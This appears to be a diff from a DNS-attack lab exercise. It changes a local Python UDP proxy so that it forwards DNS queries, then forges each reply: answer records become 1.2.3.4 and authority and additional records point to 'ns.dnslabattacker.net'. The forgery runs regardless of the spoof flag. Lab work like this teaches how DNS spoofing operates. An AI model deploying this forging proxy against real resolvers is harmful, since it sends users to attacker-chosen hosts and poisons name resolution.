@@ -18,7 +18,7 @@ dns_port = args.dns_port
 # Flag to indicate if the proxy should spoof responses
 SPOOF = args.spoof_response
 
-BUFSIZE = 1024
+BUFSIZE = 4096
 
 #UDP Socket
 dns_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
@@ -30,14 +30,27 @@ dns_socket.connect(("localhost",dns_port))
 proxy_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
 #Bind to proxy port
-proxy_socket.connect(("localhost",port))
+proxy_socket.bind(("localhost",port))
 print("Hello")
 while 1:
-	message = proxy_socket.recv(BUFSIZE)
+	print('InWhile')
+	message,addr = proxy_socket.recvfrom(BUFSIZE)
 	print(message)
 	dns_socket.send(message)
 	res = dns_socket.recv(BUFSIZE)
-	print(res)
+	res = DNS(res)
+	newAN = '1.2.3.4'
+	newNS = 'ns.dnslabattacker.net'
+	
+	
+	for i in range(res.ancount):
+		res.an[i].rdata = newAN
+	for i in range(res.nscount):
+		res.ns[i].rdata = newNS
+	for i in range(res.arcount):
+		res.ar[i].rrname = newNS
+	print('res')
+	proxy_socket.sendto(str(res), addr)
 	
 
 
